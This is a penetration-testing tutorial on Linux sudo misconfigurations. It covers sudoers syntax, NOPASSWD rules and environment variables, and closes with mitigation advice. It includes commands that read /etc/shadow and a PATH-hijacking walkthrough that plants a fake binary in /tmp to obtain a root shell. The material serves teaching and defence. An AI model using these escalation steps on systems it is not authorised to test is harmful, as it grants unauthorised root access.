# Introduction

Sudo is one of the most common mechanisms used in Linux systems to delegate administrative privileges to regular users.

During penetration tests, incorrect sudo configurations are a common privilege escalation vector.

A low-privileged user may be able to execute specific commands as root due to:

- Weak sudo rules
- Incorrect permissions
- Dangerous binaries
- Missing password requirements
- Unsafe environment configurations

The main objective is:

```
Low Privileged User

↓

Root User
```

---

# What is Sudo?

Sudo stands for:

```
Super User Do
```

It allows permitted users to execute commands with elevated privileges.

Example:

Normal user:

```bash
cat /etc/shadow
```

Permission denied.

Using sudo:

```bash
sudo cat /etc/shadow
```

The command executes with root privileges.

---

# How Sudo Works

Sudo permissions are controlled by:

```
/etc/sudoers
```

and:

```
/etc/sudoers.d/
```

Example rule:

```
user ALL=(ALL) /usr/bin/systemctl
```

Meaning:

```
User:

user

Host:

ALL

Execute as:

ALL users

Command:

systemctl
```

---

# Checking Sudo Permissions

After obtaining a shell, always run:

```bash
sudo -l
```

Example:

```
User user may run the following commands:

(root) NOPASSWD: /usr/bin/vim
```

This means:

- User can execute vim
- As root
- Without password

This can lead to privilege escalation.

---

# Understanding Sudoers File

View sudo configuration:

```bash
cat /etc/sudoers
```

Example:

```
root ALL=(ALL:ALL) ALL

%sudo ALL=(ALL:ALL) ALL
```

---

Important syntax:

```
USER HOST=(RUNAS) COMMAND
```

Example:

```
bob ALL=(root) /usr/bin/python3
```

Meaning:

Bob can run:

```
python3
```

as:

```
root
```

# Common Sudo Misconfigurations

Common mistakes include:

- Allowing dangerous binaries
- Using NOPASSWD incorrectly
- Allowing scripts as root
- Allowing unrestricted commands
- Using wildcards
- Allowing environment manipulation

---

# NOPASSWD Misconfiguration

NOPASSWD allows commands to execute without requiring a password.

Example:

```
bob ALL=(root) NOPASSWD: /usr/bin/vim
```

The user can run:

```bash
sudo vim
```

without authentication.

If the binary can execute commands, it may provide root access.

---

# Sudo Environment Variables

Check:

```bash
sudo -l
```

Look for:

```
env_keep
```

```
LD_PRELOAD

LD_LIBRARY_PATH

PYTHONPATH
```

# PATH Hijacking

PATH determines where Linux searches for commands.

Example:

```
PATH=/usr/local/bin:/usr/bin:/bin
```

A vulnerable sudo rule:

```
sudo /opt/script.sh
```

Script:

```bash
backup
```

If the script does not use absolute paths:

```
backup
```

An attacker can create:

```
/tmp/backup
```

with malicious code.

Example:

```bash
echo "/bin/bash" > backup

chmod +x backup
```

Modify PATH:

```bash
export PATH=/tmp:$PATH
```

Execute:

```bash
sudo /opt/script.sh
```

Result:

```
root shell
```

# Defense & Mitigation

Secure sudo configurations by:

- Applying least privilege
- Avoiding NOPASSWD when unnecessary
- Restricting dangerous binaries
- Using absolute paths
- Reviewing sudoers regularly
- Removing unused permissions
- Updating sudo versions
- Monitoring sudo activity
